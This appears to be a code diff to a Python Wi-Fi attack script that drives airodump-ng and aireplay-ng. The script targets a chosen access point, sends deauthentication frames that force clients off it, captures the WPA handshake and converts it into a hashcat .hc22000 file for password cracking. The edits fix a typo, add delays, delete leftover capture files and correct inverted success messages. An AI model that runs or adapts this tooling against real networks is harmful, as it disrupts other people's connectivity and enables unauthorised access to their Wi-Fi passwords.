@@ -15,7 +15,7 @@ def check_tool():
             print(Fore.BLUE + f"{tool} is installed\n")
         except sub.CalledProcessError:
             print(Fore.RED + f"{tool} is not installed\n")
-            decision = input(Fore.YELLOW + f"Dou you want install {tool}: (YES - y ||| NO - n): ")
+            decision = input(Fore.YELLOW + f"Do you want install {tool}: (YES - y ||| NO - n): ")
             if decision == "y":
                 dowload = sub.Popen(["apt", "install", tool])
                 dowload.wait()
@@ -70,7 +70,7 @@ def scan_wifi(mon_interface):
 def scan_target(bssid, channel, mon_interface, name,zaman):
 
     airodump_process = sub.Popen(["xterm", "-geometry", "100x60+100+100", "-e", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", name, mon_interface])
-
+    time.sleep(2)
     aireplay_process = sub.Popen(["xterm","-geometry", "100x60+800+100", "-e", "aireplay-ng", "--deauth", "15", "-a", bssid, mon_interface])
     aireplay_process.wait()
 
@@ -92,7 +92,8 @@ def convert(name):
 
     file1 = glob.glob(name+"*.csv")
     file2 = glob.glob(name+"*.netxml")
-    delete_files = file1 + file2
+    file3 = glob.glob(name+"*cap")
+    delete_files = file1 + file2 + file3
     for filename in delete_files:
         sub.Popen(["rm", filename])
 
@@ -100,10 +101,11 @@ def convert(name):
 
 
 def checking(name):
+    time.sleep(1.5)
     if glob.glob(name + ".hc22000"):
-        print(Fore.RED + "\nPassword not found")
+        print(Fore.GREEN + "\nPassword found ---->> " + name + ".hc22000")
     else:
-        print(Fore.GREEN + "\nPassword found ---->> " + name + ".hc22000" )
+        print(Fore.RED + "\nPassword not found")
 
 
 
@@ -150,5 +152,3 @@ checking(name)
 
 if input(Fore.YELLOW + "\nSwitch to interface managed mode? ( yes-y || No-n ): ") == "y":
     managed_mode(mon_interface)
-
-
